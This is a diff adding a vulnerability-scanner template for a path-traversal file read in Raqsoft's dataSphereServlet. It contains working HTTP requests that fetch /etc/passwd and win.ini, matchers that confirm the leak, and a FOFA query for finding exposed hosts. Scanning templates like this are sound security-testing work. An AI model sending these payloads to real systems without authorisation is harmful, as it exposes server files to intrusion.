@@ -1,0 +1,64 @@
+id: raqsoft-demo-servlet-dataSphereServlet-fileread
+info:
+  name: 润乾报表 /demo/servlet/dataSphereServlet - fileread
+  author: leadlife
+  severity: high
+  description: todo
+  reference: 
+    - https://github.com/ibaiw/2024Hvv/blob/dca4284a493278e19dfb4512a8afa0fd47b162ce/%E6%B6%A6%E4%B9%BE%E6%8A%A5%E8%A1%A8dataSphereServlet%E6%8E%A5%E5%8F%A3%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="/raqsoft"
+    hunter-query: demo
+    tips: other payload path=../../../../../../../../../../../windows/win.ini&content=&mode=
+    repair:
+    version:
+  tags: raqsoft,fileread
+
+http:
+  - raw:
+      - |
+        POST /demo/servlet/dataSphereServlet?action=11 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://192.168.31.133:6868/demo/
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 54
+
+        path=../../../../../../../../../../../windows/win.ini&content=&mode=
+
+      - |
+        POST /demo/servlet/dataSphereServlet?action=11 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: en-US,en;q=0.5
+        Accept-Encoding: gzip, deflate
+        Referer: http://192.168.31.133:6868/demo/
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 54
+
+        path=../../../../../../../../../../../etc/passwd&content=&mode=
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "\\[(font|extension|file)s\\]"
+          - "root:.*:0:0:"
+        condition: or
+
+      - type: status
+        status:
+          - 200
